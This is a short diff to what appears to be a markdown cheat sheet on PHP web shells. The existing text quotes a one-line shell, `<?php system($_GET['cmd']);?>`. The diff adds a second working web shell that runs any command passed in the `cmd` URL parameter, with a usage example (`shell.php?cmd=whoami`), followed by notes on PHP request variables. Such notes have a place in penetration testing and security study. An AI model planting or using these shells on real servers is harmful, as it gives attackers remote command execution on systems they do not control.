@@ -19,6 +19,16 @@ Garr uses: `<?php system($_GET['cmd']);?>`
 ?>
 ```
 
+```php
+<?php
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+?>
+```
+
+Use with `shell.php?cmd=whoami`
+
 `$_POST` can catch the data which is sent using POST method
 `$_GET` can catch the data which is sent using GET method
 `$_REQUEST` can catch the data which is sent using **both POST & GET methods**
